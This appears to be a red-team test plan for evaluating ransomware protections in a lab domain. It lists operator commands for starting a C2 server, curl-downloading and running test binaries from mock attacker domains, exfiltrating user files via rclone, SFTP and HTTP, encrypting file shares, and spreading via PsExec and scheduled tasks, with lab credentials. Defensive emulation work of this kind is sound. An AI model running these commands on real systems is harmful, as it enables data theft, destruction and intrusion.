# Ransomware Protections Micros

## Setup

* From your Kali attack host `corsair (223.246.0.70)`, open a new terminal tab and run the following commands to start the C2 server for protections:

```zsh
cd /opt/kalidev/evalsC2server
sudo go build -o controlServer main.go
sudo ./controlServer -c config/protections.yml
```

* ⚠️ Ensure that the C2 has started with the `[Simple File Server]` handler enabled.

## Test 1: Enumeration and Exfiltration via Batch Script and rclone

### :microphone: Voice Track

Test 1 emulates ransomware affiliates enumerating via batch script and
exfiltration of files of interest via rclone. The setup on the victim
host for this test includes pre-positioning of a batch script on victim
`bts (10.222.25.61)` in C:\Windows\Temp\test1.bat and opening an elevated
Command Prompt as sonicbeats37.fm\yoona.

The test begins with execution of the batch script. The batch script will
enumerate all user Desktop, Documents, and Downloads directories, create
zips of files within the target directories, then exfiltrate the zips using
rclone to the adversary server at `m1sfir3d.blog (36.43.97.151)`. The batch
script will sleep for 30 seconds in between zip creations and rclone
exfiltrations.

### :hammer: Setup

* From your Kali attack host `corsair (223.246.0.70)`, open a new terminal tab
to setup the `rclone` server to receive the exfiltrated files:

    ```cmd
    sudo rclone serve webdav /srv/http --addr 223.246.0.70:8080
    ```

* Ensure the Simple File Server handler is enabled and running

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, RDP to
`bts (10.222.25.61)` as `sonicbeats37.fm\yoona` if not already connected

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | bts.sonicbeats37.fm | sonicbeats37.fm\yoona | Exposed-Backpack |

* Search for Command Prompt and right-click to Run As Administrator

* Download the batch script from the adversary server using curl

    ```cmd
    curl --output "C:\Windows\Temp\test1.bat" http://m1sfir3d.blog/files/test1.bat
    ```

### :biohazard: Procedures

* Execute the batch script from your Administrative Command Prompt terminal.

    ```cmd
    C:\Windows\Temp\test1.bat http://36.43.97.65
    ```

* :camera: Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).

### :broom: Cleanup

* In the elevated Command Prompt withing the RDP to `bts (10.222.25.61)`,
download the cleanup script using curl.

    ```cmd
    curl --output "C:\Windows\Temp\cleanup_test1.bat" http://m1sfir3d.blog/files/cleanup_test1.bat
    ```

* Execute the cleanup script.

    ```cmd
    C:\Windows\Temp\cleanup_test1.bat
    ```

### :mag: ATT&CK Techniques and Reference Code

:information_source: NOTE: Only the techniques under test are listed in this table

| Red Team Activity | Source Code Link | ATT&CK Technique |
| ----------------- | ---------------- | ---------------- |
| cmd.exe executes test1.bat | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell |
| test1.bat enumerates files in all user Desktop, Documents, and Downloads folders | [enumerate files](../Resources/test1/test1.bat#L15) | T1083 File and Directory Discovery |
| test1.bat compresses files in a zip archive | [archive](../Resources/test1/test1.bat#L23) | T1560.002 Archive Collected Data: Archive via Library |
| test1.bat exfiltrates the archives using rclone | [exfiltrate](../Resources/test1/test1.bat#L55) | T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol |

## Test 2: Windows Exfiltration: Archive and SFTP

### :microphone: Voice Track

Test 2 emulates a ransomware threat actor attempting to zip files and
exfiltrate them via SFTP on a windows target. The setup includes
pre-positioning an executable file on a victim host
`bts (10.222.25.61)` at the location `C:\Windows\Temp\test2.exe`. A
command prompt window will be opened as user `yoona` and the executable
will be run without arguments.

The test begins with enumeration of all user directories inside of `C:\Users\`.
Any `Desktop`, `Documents`, or `Downloads` directory will be zipped into
individual zip archives. The executable will sleep for 15-30 seconds after each
zip file creation.

After all of the zips have been created, the executable will establish a
connection to the attacker-controlled SFTP server. Once established, the
executable will upload each zip archive to the SFTP server, sleeping for 15-30
seconds after each upload has completed. Finally, the executable will output the
list of uploaded files in the SFTP server.

### :hammer: Setup

#### SFTP Check

* From your Kali attack host `corsair (223.246.0.70)`, open a new terminal tab
and execute the following command to ensure that the SFTP server is running:

    ```bash
    sftp sftp_user@36.43.97.72
    ```

    | Username | Password |
    | -------- | -------- |
    | sftp_user | Password1! |
  
* After successful authentication, run the following commands:

    ```bash
    pwd
    ls
    ```

If the server responds without error, the SFTP server is running correctly.

#### Executable transfer

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, RDP into the
victim host `bts (10.222.25.61)` as `sonicbeats37.fm\yoona` if not already connected.

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | bts.sonicbeats37.fm | sonicbeats37.fm\yoona | Exposed-Backpack |

* Open an elevated command prompt and execute the following command to download
the test binary from the attacker server:

    ```cmd
    curl.exe --output "C:\Windows\Temp\test2.exe" http://d3fend-ev1l.radio/files/test2.exe
    ```

* Change directories to the directory containing the `test2.exe` binary.

    ```cmd
    cd C:\Windows\Temp
    ```

### :biohazard: Procedures

* Execute the test binary.

```cmd
test2.exe
```

After the executable has finished running, check that zip
archives were uploaded to the SFTP server:

:arrow_right: Switch to your Kali attacker machine and open a terminal tab.

* Run the following command to log into SFTP:

```bash
sftp sftp_user@36.43.97.72
```

| Username | Password |
| -------- | -------- |
| sftp_user | Password1! |

* After successful authentication, run the following commands:

```bash
ls
```

If there are zip files present, the test completed successfully.

* :camera: Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).

### :broom: Cleanup

* Run the following command to remove the created zip files from the victim
host, and then check that there are no zip files left and the executable has
been removed:

```cmd
del *.zip
del test2.exe
dir
```

### :mag: ATT&CK Techniques and Reference Code

:information_source: NOTE: Only the techniques under test are listed in this table

| Red Team Activity | Source Code Link | ATT&CK Technique |
| ----------------- | ---------------- | ---------------- |
| cmd.exe executes test2.exe | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell |
| test2.exe enumerates files in all user Desktop, Documents, and Downloads folders | [get_target_dirs](../Resources/test2/main.go#L86) | T1083 File and Directory Discovery |
| test2.exe compresses files in zip archives | [create_zip](../Resources/test2/main.go#L126) | T1560.002 Archive Collected Data: Archive via Library |
| test2.exe exfiltrates zip archives over SFTP | [exfiltrate](../Resources/test2/main.go#L59) | T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol |

## Test 3: Enumeration and Exfiltration via APIs and HTTP

### :microphone: Voice Track

Test 3 emulates a ransomware threat actor attempting to zip files in 1MB chunks and
exfiltrate them via HTTP on a Linux target. The setup includes
pre-positioning an executable file on a victim host
`lisa (10.222.25.65)` at the location `/tmp/test3`. A
terminal window will be opened as user `user2` and the executable
will be run without arguments.

The test begins with enumeration of all user directories inside of `/home/`.
All files found in the `Desktop`, `Documents`, or `Downloads` directories will
be zipped into zip archives up to 1MB.

After all of the zips have been created, the executable will upload
each zip archive to the adversary server via HTTP POST requests.

### :hammer: Setup

* Ensure the Simple File Server handler is enabled and running from your Kali
attack host `corsair (223.246.0.70)`

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, open
Powershell and SSH into the victim host `lisa (10.222.25.65)` as
`sonicbeats37.fm\sooyoung` using the following command:

    ```bash
    ssh sooyoung@10.222.25.65
    ```

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | lisa.sonicbeats37.fm | sonicbeats37.fm\sooyoung | Dental-Crew |

* Execute the following command in your terminal to download the test
binary from the attacker server:

    ```cmd
    curl --output "/tmp/test3" http://c4sh-m0n33y.fr/files/test3
    ```

* Change directories to the directory containing the `test3` binary.

    ```cmd
    cd /tmp
    ```

* Change the binary to be executable

    ```cmd
    chmod +x test3
    ```

### :biohazard: Procedures

* Execute the test binary.

    ```cmd
    ./test3
    ```

* Check the control server log to ensure that the zip archives were uploaded to
the attack host.

* :camera: Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).

### :broom: Cleanup

* From the `/tmp/` directory, run the following command to remove the created
zip files and executable from the victim host, and check that everything has
been successfully removed.

    ```cmd
    rm archive*
    rm test3
    ls
    ```

* Terminate the controlServer via 'ctrl+c' from your Kali machine

### :mag: ATT&CK Techniques and Reference Code

:information_source: NOTE: Only the techniques under test are listed in this table

| Red Team Activity | Source Code Link | ATT&CK Technique |
| ----------------- | ---------------- | ---------------- |
| /bin/bash executes test3 | - | T1059.004 Command and Scripting Interpreter: Unix Shell |
| test3 enumerates files in all user Desktop, Documents, and Downloads folders | [getTargetFiles](../Resources/test3/main.go#L38) | T1083 File and Directory Discovery |
| test3 zips target directories in 1MB chunks | [zipTargetDirs](../Resources/test3/main.go#L63) | T1560.002 Archive Collected Data: Archive via Library |
| test3 exfiltrates zip archives using HTTP POST | [exfilZips](../Resources/test3/main.go#L146) | T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol |

## Test 4: PowerShell Script Encryption

### :microphone: Voice Track

Test 4 emulates a ransomware threat actor attempting to encrypt files on
a remote windows file server using a PowerShell script. The
setup includes copying the contents of a PowerShell script from a non-victim
browser. A PowerShell window will be opened as user `yoona`. The script
will be executed with the appropriate arguments targeting the mounted drive of the
managed remote file server.

The test begins with enumeration of all files and
directories inside of `Z:\` using `Get-ChildItem`.
After all files have been enumerated, they will all be encrypted using
an encryption key generated by the test4 application.
Target files will be overwritten by the corresponding encrypted contents.

### :hammer: Setup

:arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, RDP into the
victim host `bts (10.222.25.61)` as `sonicbeats37.fm\yoona` if not already connected.

| Hostname | Username | Password |
| -------- | -------- | -------- |
| bts.sonicbeats37.fm | sonicbeats37.fm\yoona | Exposed-Backpack |

* Search for and open PowerShell

* :arrow_right: In a Browser on a **non-victim machine**, browse to [test4.ps1](../Resources/test4/test4.ps1)
and copy the script contents.

* :arrow_right: Return to the RDP to `bts (10.222.25.61)`. Paste the test4.ps1
content into the PowerShell window and press enter.

### :biohazard: Procedures

* Execute the test with the target file path.

```cmd
Execute-Test -action encrypt -startFolder Z:\
```

* :camera: Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).

### :broom: Cleanup

* Rerun the the test4 script with the `decrypt` action.

```cmd
Execute-Test -action decrypt -startFolder Z:\ -key [KEY GENERATED DURING ENCRYPTION]
```

### :mag: ATT&CK Techniques and Reference Code

:information_source: NOTE: Only the techniques under test are listed in this table

| Red Team Activity | Source Code Link | ATT&CK Technique |
| ----------------- | ---------------- | ---------------- |
| powershell.exe executes test4.ps1 | - | T1059.001 Command and Scripting Interpreter: PowerShell |
| test4.ps1 enumerates all files and folders recursively in Z:\ | [Get-ChildItem](../Resources/test4/test4.ps1#L64) | T1083 File and Directory Discovery |
| test4.ps1 encrypts files discovered in Z:\ | [encryption](../Resources/test4/test4.ps1#L12) | T1486 Data Encrypted For Impact |

## Test 5: Remote API and Library Encryption

### :microphone: Voice Track

Test 5 emulates a ransomware threat actor attempting to encrypt files on
a remote windows file server using third party libraries and Windows API's. The
setup includes pre-positioning an executable file on an unmanaged victim host
`eyescream (199.88.44.201)` at the location `C:\Windows\Temp\test5.exe`. A
command prompt window will be opened as user `yoona`. The executable
will be executed with the argument `Z:\` targeting the mounted drive of the
managed remote file server.

The test begins with enumeration of all files and
directories inside of `Z:\`. Any file that is deemed not a
system file, sym-link, or directory will be added to a file list.
After all files have been enumerated, they will all be encrypted using
an encryption key generated by the test5 application. The executable will
sleep for 250-1000 milliseconds after each file is encrypted.

### :hammer: Setup

:arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, RDP into the
victim host `eyescream (199.88.44.201)` as `op1` if not already connected.

| Hostname | Username | Password |
| -------- | -------- | -------- |
| 199.88.44.201 | op1 | Subpar-Parabola |

* Search for and open Command Prompt

* Execute the following command to transfer the file to the victim host:

    ```bash
    curl --output "C:\Windows\Temp\test5.exe" http://223.246.0.70/files/test5.exe
    ```

* Change directories to the directory containing the `test5.exe` binary.

    ```cmd
    cd C:\Windows\Temp
    ```

* Execute the following command to ensure the `Z:` network drive is mapped:

    ```cmd
    net use
    ```

  * If the Z: is not mounted to `asix (10.222.15.15)`, mount the
  share and enter the password when prompted:

    ```cmd
    net use Z: \\10.222.15.15\D$\data /persistent:yes /user:sonicbeats37.fm\sooyoung Dental-Crew
    ```

### :biohazard: Procedures

* Execute the test binary with the target file path.

```cmd
C:\Windows\Temp\test5.exe Z:\ encrypt
```

* :camera: Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).

### :broom: Cleanup

* Rerun the the test5 application with the `decrypt` argument and unmount the file share.

```cmd
C:\Windows\Temp\test5.exe Z:\ decrypt
net use Z: /delete
```

### :mag: ATT&CK Techniques and Reference Code

:information_source: NOTE: Only the techniques under test are listed in this table

| Red Team Activity | Source Code Link | ATT&CK Technique |
| ----------------- | ---------------- | ---------------- |
| cmd.exe executes test5.exe | - | T1059.003: Command and Scripting Interpreter: Windows Command Shell |
| test5.exe enumerates all files and folders recursively in Z:\ | [enumeration](../Resources/test5/src/enum.cpp#L17) | T1083 File and Directory Discovery |
| test5.exe uses FindFirstFile and FindNextFile to enumerate files in Z:\ | [FindFirstFile](../Resources/test5/src/enum.cpp#L26) | T1106 Native API |
| test5.exe encrypts files discovered in Z:\ | [encryption](../Resources/test5/src/main.cpp#L18) | T1486 Data Encrypted For Impact |

## Test 6: Bash Script Encryption

### :microphone: Voice Track

Test 6 emulates a ransomware threat actor attempting to encrypt files on
a Linux file system using OpenSSL in a bash script. The
setup includes pre-positioning a bash file on victim host
`lisa (10.222.25.65)` at the location `/tmp/test6.sh`. The script
will be executed with the argument `/home`.

Once the script is executed it will begin enumerating all files and
directories inside of `/home`. Any file that is deemed not a directory
will be encrypted using an encryption key generated with OpenSSL inside
the test6 bash script.

### :hammer: Setup

* From your Kali attack host `corsair (223.246.0.70)`, open a new terminal tab
and execute the following command to transfer the file to the victim host:

    ```bash
    scp /opt/kalidev/LockBit/Resources/payloads/test6.sh sooyoung@10.222.25.65:/tmp/
    ```

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, open
Powershell and SSH into the victim host `lisa (10.222.25.65)` as `sonicbeats37.fm\sooyoung`
using the following command:

    ```bash
    ssh sooyoung@10.222.25.65
    ```

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | lisa.sonicbeats37.fm | sonicbeats37.fm\sooyoung | Dental-Crew |

* Adjust the bash script permissions to allow the script to execute:

    ```bash
    chmod +x /tmp/test6.sh
    ```

### :biohazard: Procedures

* Execute the test bash script with the target file path.

```bash
sudo /tmp/test6.sh /home
```

* :camera: Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).

### :broom: Cleanup

* No cleanup available for Test 6. Reset `lisa (10.222.25.65)` if needed.

### :mag: ATT&CK Techniques and Reference Code

:information_source: NOTE: Only the techniques under test are listed in this table

| Red Team Activity | Source Code Link | ATT&CK Technique |
| ----------------- | ---------------- | ---------------- |
| /bin/bash executes test6.sh | - | T1059.004 Command and Scripting Interpreter: Unix Shell |
| test6.sh enumerates files in /home | [recurse_directories](../Resources/test6/test6.sh#L14) | T1083 File and Directory Discovery |
| test6.sh Encrypts files discovered on disk with OpenSSL using Blowfish in CBC mode | [encrypt_file](../Resources/test6/test6.sh#L8) | T1486 Data Encrypted For Impact |

## Test 7: Propagation: NetBIOS and PsExec

### :microphone: Voice Track

Test 7 emulates a threat actor that uses NetBIOS scans and PsExec to propagate
across Windows devices in a network.

The test setup includes pre-positioning an executable file on a Windows
workstation `bts (10.222.25.61)` at the location `C:\Windows\Temp\test7.exe`.
A command prompt window will be opened as domain admin `sooyoung`. The executable
will be executed with no arguments and will log activity to `test7.log` in the
current working directory.

The test begins with discovering which local networks the workstation is on and
scanning those networks with NetBIOS lookups to see which IP addresses respond
as Windows machines. Upon having discovered at least one Windows target, the
test binary will drop an embedded PsExec binary to disk at `C:\Windows\Temp\pm.exe`
and run it to copy itself and execute itself on each target. The propagated
processes will attempt to run as the SYSTEM user.

### :hammer: Setup

:arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, RDP into the
victim host `bts (10.222.25.61)` as `sonicbeats37.fm\sooyoung`.

| Hostname | Username | Password |
| -------- | -------- | -------- |
| bts.sonicbeats37.fm | sonicbeats37.fm\sooyoung | Dental-Crew |

* Search for Command Prompt and right-click to Run As Administrator then execute
the following command to download the test binary from the attacker server:

```cmd
curl.exe --output "C:\Windows\Temp\test7.exe" http://off1ce-p4p4r.co.uk/files/test7.exe
```

* In the Command Prompt window, change directories to the directory
containing the `test7.exe` binary.

```cmd
cd C:\Windows\Temp
```

### :biohazard: Procedures

* Execute the test binary

```cmd
C:\Windows\Temp\test7.exe
```

* If the command prompt window remains open, look through the terminal output to
confirm that NetBIOS scanning found at least 1 target and that PsExec was
successfully dropped and executed against the target hosts.

* If the EDR tooling closes the command prompt window as part of its blocking
process, open a PowerShell terminal and run the following command to view the
log file and determine how far the test binary got prior to the block:

```PowerShell
type C:\Windows\Temp\test7.log
```

* :camera: Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).

### :broom: Cleanup

* Open an elevated PowerShell prompt on workstation and execute the following:

```PowerShell
rm -force C:\windows\temp\test7.exe
rm -force C:\Windows\temp\pm.exe
Invoke-Command -Computer exo -Scriptblock {
    rm -force C:\Windows\test7.exe;
}
```

### :mag: ATT&CK Techniques and Reference Code

:information_source: NOTE: Only the techniques under test are listed in this table

| Red Team Activity | Source Code Link | ATT&CK Technique |
| ----------------- | ---------------- | ---------------- |
| cmd.exe executes test7.exe | - | T1059.003: Command and Scripting Interpreter: Windows Command Shell |
| test7.exe discovers local IP networks via GetAdaptersInfo | [get_local_ipv4_and_cidr](../Resources/test7/src/latmove/local_ips.rs#L21) | T1016 System Network Configuration Discovery |
| test7.exe performs NetBIOS scans | [scan](../Resources/test7/src/latmove/nbtscan/lib.rs#L52) | T1018 Remote System Discovery |
| test7.exe executes PsExec to propagate to additional targets | [run_psexec](../Resources/test7/src/psexec.rs#L105) | T1021.002 Remote Services: SMB/Windows Admin Shares |
| PsExec creates a service | - | T1543.003 Create or Modify System Process: Windows Service |
| PsExec copies test7.exe to additional targets | - | T1570 Lateral Tool Transfer |
| PsExec executes test7.exe on additional targets | - | T1569.002 System Services: Service Execution |

## Test 8: Propagation: Network Share and Scheduled Tasks

### :microphone: Voice Track

Test 8 emulates a threat actor that uses remote scheduled tasks to propagate
from a file server to hosts that are connected to the file server's shares.

The test setup includes pre-positioning an executable file on a file server
`asix (10.222.15.15)` at the location `C:\Windows\Temp\test8.exe`. A
command prompt window will be opened as domain admin user `sooyoung`. The executable
will be executed with no arguments and will log activity to `test8.log` in the current
working directory.

The test begins with enumeration of all hosts that have a connected network
session to the file server. For each discovered host, the test binary will copy
itself to the `C:\Windows\System32` folder of the remote host and then create a
scheduled task `\Microsoft\Windows\Net Session File Management Task` on the
remote host. The created task will automatically execute 15 seconds after being
registered.

### :hammer: Setup

* :arrow_right: RDP into the victim workstation `bts (10.222.25.61)` as `sonicbeats37.fm\yoona` if not already connected.

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | bts.sonicbeats37.fm | sonicbeats37.fm\yoona | Exposed-Backpack |

  :o: Disconnect (**do not sign out**) from `bts (10.222.25.61)`

* :arrow_right: RDP into the victim workstation `exo (10.222.25.62)` as `sonicbeats37.fm\sunny`.

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | exo.sonicbeats37.fm | sonicbeats37.fm\sunny | Angular-Porch |

  :o: Disconnect (**do not sign out**) from `exo (10.222.25.62)`

* :arrow_right: RDP into the domain controller `blackpink (10.222.15.10)` as `sonicbeats37.fm\sooyoung`.

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | blackpink.sonicbeats37.fm | sonicbeats37.fm\sooyoung | Dental-Crew |

  :o: Disconnect (**do not sign out**) from `blackpink (10.222.15.10)`

* :arrow_right: RDP into the victim file server `asix (10.222.15.15)` as `sonicbeats37.fm\sooyoung`.

    | Hostname | Username | Password |
    | -------- | -------- | -------- |
    | asix.sonicbeats37.fm | sonicbeats37.fm\sooyoung | Dental-Crew |

* Open an elevated command prompt and execute the following command to download
the test binary from the attacker server:

    ```cmd
    curl.exe --output "C:\Windows\Temp\test8.exe" http://p1nk-p3ncil.net/files/test8.exe
    ```

* Change directories to the directory containing the `test8.exe` binary.

    ```cmd
    cd C:\Windows\Temp
    ```

### :biohazard: Procedures

* Execute the test binary

```cmd
C:\Windows\Temp\test8.exe
```

* If the command prompt window remains open, look through the log messages to
confirm that host enumeration, remote file copies, and remote scheduled task
creation were successful.

* :camera: Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).

### :broom: Cleanup

* Open an elevated PowerShell prompt on the file server and execute the following:

```PowerShell
rm -force C:\Windows\Temp\test8.exe
Invoke-Command -Computer bts,exo,blackpink -Scriptblock {
    schtasks /delete /TN "\Microsoft\Windows\Net Session File Management Task" /F;
    rm -force C:\Windows\System32\test8.exe;
}
```

### :mag: ATT&CK Techniques and Reference Code

:information_source: NOTE: Only the techniques under test are listed in this table

| Red Team Activity | Source Code Link | ATT&CK Technique |
| ----------------- | ---------------- | ---------------- |
| cmd.exe executes test8.exe | - | T1059.003: Command and Scripting Interpreter: Windows Command Shell |
| test8.exe enumerates all network sessions connected to the file server | [sessions](../Resources/test8/src/sessions.cpp#L12) | T1049 System Network Connections Discovery |
| test8.exe copies itself to discovered hosts | [main](../Resources/test8/src/main.cpp#L84) | T1570 Lateral Tool Transfer |
| test8.exe creates remote scheduled tasks that execute 15 seconds after being registered | [lat_move](../Resources/test8/src/lat_move.cpp#L28) | T1053.005 Scheduled Task/Job: Scheduled Task |
